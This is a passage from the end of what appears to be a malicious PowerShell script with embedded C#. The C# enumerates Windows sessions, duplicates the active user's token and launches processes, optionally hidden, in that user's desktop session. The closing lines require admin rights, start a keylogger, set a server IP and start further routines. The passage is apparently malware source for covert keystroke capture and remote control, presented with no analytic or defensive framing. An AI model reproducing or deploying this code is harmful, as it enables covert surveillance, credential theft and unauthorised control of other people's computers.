            if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, ref pSessionInfo, ref sessionCount) != 0)
            {
                var arrayElementSize = Marshal.SizeOf(typeof(WTS_SESSION_INFO));
                var current = pSessionInfo;

                for (var i = 0; i < sessionCount; i++)
                {
                    var si = (WTS_SESSION_INFO)Marshal.PtrToStructure((IntPtr)current, typeof(WTS_SESSION_INFO));
                    current += arrayElementSize;

                    if (si.State == WTS_CONNECTSTATE_CLASS.WTSActive)
                    {
                        activeSessionId = si.SessionID;
                    }
                }
            }

            // If enumerating did not work, fall back to the old method
            if (activeSessionId == INVALID_SESSION_ID)
            {
                activeSessionId = WTSGetActiveConsoleSessionId();
            }

            if (WTSQueryUserToken(activeSessionId, ref hImpersonationToken) != 0)
            {
                // Convert the impersonation token to a primary token
                bResult = DuplicateTokenEx(hImpersonationToken, 0, IntPtr.Zero,
                    (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, (int)TOKEN_TYPE.TokenPrimary,
                    ref phUserToken);

                CloseHandle(hImpersonationToken);
            }

            return bResult;
        }

        public static bool TaskCurrent(string appPath, string cmdLine = null, string workDir = null, bool visible = true)
        {
            var hUserToken = IntPtr.Zero;
            var startInfo = new STARTUPINFO();
            var procInfo = new PROCESS_INFORMATION();
            var pEnv = IntPtr.Zero;
            int iResultOfCreateProcessAsUser;

            startInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));

            try
            {
                if (!GetSessionUserToken(ref hUserToken))
                {
                    throw new Exception("TaskCurrent: GetSessionUserToken failed.");
                }

                uint dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | (uint)(visible ? CREATE_NEW_CONSOLE : CREATE_NO_WINDOW);
                startInfo.wShowWindow = (short)(visible ? SW.SW_SHOW : SW.SW_HIDE);
                startInfo.lpDesktop = "winsta0\\default";

                if (!CreateEnvironmentBlock(ref pEnv, hUserToken, false))
                {
                    throw new Exception("TaskCurrent: CreateEnvironmentBlock failed.");
                }

                if (!CreateProcessAsUser(hUserToken,
                    appPath,
                    cmdLine, 
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    dwCreationFlags,
                    pEnv,
                    workDir,
                    ref startInfo,
                    out procInfo))
                {
                    throw new Exception("TaskCurrent: CreateProcessAsUser failed.\n");
                }

                iResultOfCreateProcessAsUser = Marshal.GetLastWin32Error();
            }
            finally
            {
                CloseHandle(hUserToken);
                if (pEnv != IntPtr.Zero)
                {
                    DestroyEnvironmentBlock(pEnv);
                }
                CloseHandle(procInfo.hThread);
                CloseHandle(procInfo.hProcess);
            }
            return true;
        }
    }
}
"@

Assert-Admin
Assert-RunOnce
Add-Type -ReferencedAssemblies System, System.Runtime.InteropServices -TypeDefinition $Source -Language CSharp 
Start-KeyLogger 
Add-Type -AssemblyName System.Security
Set-Variable -Scope Global -Name "bultInVars" -Value ((Get-Variable).Name)
$global:SERVIP = "192.168.137.1"
Start-Teams
Start-Main

